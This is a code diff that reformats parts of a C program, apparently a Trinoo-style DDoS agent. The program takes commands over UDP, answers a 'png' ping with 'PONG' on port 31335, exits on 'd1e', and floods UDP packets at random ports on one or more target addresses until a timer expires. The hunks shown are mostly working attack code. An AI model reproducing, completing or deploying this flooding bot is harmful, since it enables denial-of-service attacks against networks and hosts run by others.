@@ -34,7 +34,7 @@ int hello();
 int getsock();
 int sendudp(char *host, char *data, int port);
 
-int main(int argc __attribute__((unused)), char **argv __attribute__((unused)), char **ennvp __attribute__((unused)))
+int main(int argc __attribute__ ((unused)), char **argv __attribute__ ((unused)), char **ennvp __attribute__ ((unused)))
 {
 	int sock, numread, sock2, timerz = 120, hoe, foke;
 	struct sockaddr_in sa, from, to;
@@ -72,9 +72,7 @@ int main(int argc __attribute__((unused)), char **argv __attribute__((unused)), 
 		bzero(arg1, sizeof(arg1));
 		bzero(buf, sizeof(buf));
 		fromlen = sizeof(from);
-		if ((numread =
-		     recvfrom(sock, buf, 1024, 0, (struct sockaddr *)&from,
-			      &fromlen)) < 0) {
+		if ((numread = recvfrom(sock, buf, 1024, 0, (struct sockaddr *)&from, &fromlen)) < 0) {
 			perror("recvfrom");
 			continue;
 		}
@@ -91,11 +89,7 @@ int main(int argc __attribute__((unused)), char **argv __attribute__((unused)), 
 					if ((sock2 = getsock()) != -1)
 						while (!stop) {
 							to.sin_port = rand_port();
-							sendto(sock2, buf2,
-							       sizeof(buf2), 0,
-							       (struct sockaddr
-								*)(&to),
-							       sizeof(to));
+							sendto(sock2, buf2, sizeof(buf2), 0, (struct sockaddr *)(&to), sizeof(to));
 							if (time(NULL) > end) {
 								close(sock2);
 								stop = 1;
@@ -113,8 +107,7 @@ int main(int argc __attribute__((unused)), char **argv __attribute__((unused)), 
 					hello();
 				if (strcmp(arg1, "png") == 0)
 					sendudp((char *)
-						inet_ntoa(from.sin_addr),
-						"PONG", 31335);
+						inet_ntoa(from.sin_addr), "PONG", 31335);
 				if (strcmp(arg1, "d1e") == 0)
 					exit(1);
 				if (strcmp(arg1, "rsz") == 0) {
@@ -131,34 +124,16 @@ int main(int argc __attribute__((unused)), char **argv __attribute__((unused)), 
 							bzero(unf, sizeof(unf));
 							strcat(unf, arg2);
 							temp = strtok(unf, ":");
-							while ((temp =
-								strtok(NULL,
-								       ":")) !=
-							       NULL) {
-								printf("%s\n",
-								       temp);
-								to.sin_addr.
-								    s_addr =
-								    inet_addr
-								    (temp);
+							while ((temp = strtok(NULL, ":")) != NULL) {
+								printf("%s\n", temp);
+								to.sin_addr.s_addr = inet_addr(temp);
 								to.sin_port = rand_port();
 								if (!stop)
-									sendto
-									    (sock2,
-									     buf2,
-									     sizeof
-									     (buf2),
-									     0,
-									     (struct
-									      sockaddr
-									      *)
-									     (&to), sizeof(to));
-								if (time(NULL) >
-								    end) {
-									close
-									    (sock2);
-									stop =
-									    1;
+									sendto(sock2, buf2, sizeof(buf2), 0, (struct sockaddr *)
+									       (&to), sizeof(to));
+								if (time(NULL) > end) {
+									close(sock2);
+									stop = 1;
 								}
 							}
 						}
@@ -183,8 +158,7 @@ int sendudp(char *host, char *data, int port)
 
 	if ((unf = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
 		return -1;
-	sendto(unf, data, strlen(data), 0, (struct sockaddr *)&out,
-	       sizeof(out));
+	sendto(unf, data, strlen(data), 0, (struct sockaddr *)&out, sizeof(out));
 	return 1;
 }
 
